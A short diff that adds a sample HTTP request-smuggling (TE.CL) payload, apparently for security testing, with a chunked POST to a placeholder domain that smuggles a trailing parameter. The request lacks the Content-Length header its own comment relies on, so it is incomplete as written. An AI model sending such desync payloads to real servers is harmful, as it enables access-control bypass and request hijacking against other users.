@@ -1,0 +1,13 @@
+# TE.CL example (for authorized testing only)
+# Front-end honors Transfer-Encoding; back-end honors Content-Length
+
+POST https://example.com/any-endpoint HTTP/1.1
+Host: example.com
+Transfer-Encoding: chunked
+Content-Type: application/x-www-form-urlencoded
+
+3
+a=1
+0
+
+X=2
